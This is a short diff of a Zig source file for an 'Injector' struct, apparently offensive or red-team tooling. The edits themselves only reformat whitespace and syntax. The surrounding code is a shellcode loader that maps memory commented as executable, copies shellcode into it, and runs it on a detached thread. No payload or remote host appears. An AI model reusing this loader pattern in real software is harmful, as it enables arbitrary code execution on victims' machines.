@@ -24,14 +24,14 @@ pub const Injector = struct {
             .TYPE = .PRIVATE,
             .ANONYMOUS = true,
         };
-        
+
         // Allocate RWX memory
         const addr = try os.mmap(null, shellcode.len, prot, flags, -1, 0);
-        
+
         // Copy shellcode
         @memcpy(addr[0..shellcode.len], shellcode);
 
-        const thread = try std.Thread.spawn(.{}, runShellcodeWrapper, .{ @intFromPtr(addr.ptr) });
+        const thread = try std.Thread.spawn(.{}, runShellcodeWrapper, .{@intFromPtr(addr.ptr)});
         thread.detach();
     }
 
@@ -51,12 +51,12 @@ pub const Injector = struct {
         const dest = @as([*]u8, @ptrCast(addr));
         @memcpy(dest[0..shellcode.len], shellcode);
 
-        const thread = try std.Thread.spawn(.{}, runShellcodeWrapper, .{ @intFromPtr(addr) });
+        const thread = try std.Thread.spawn(.{}, runShellcodeWrapper, .{@intFromPtr(addr)});
         thread.detach();
     }
 
     fn runShellcodeWrapper(addr: usize) void {
-        const ShellcodeFn = *const fn() callconv(.c) void;
+        const ShellcodeFn = *const fn () callconv(.c) void;
         const func = @as(ShellcodeFn, @ptrFromInt(addr));
         func();
     }
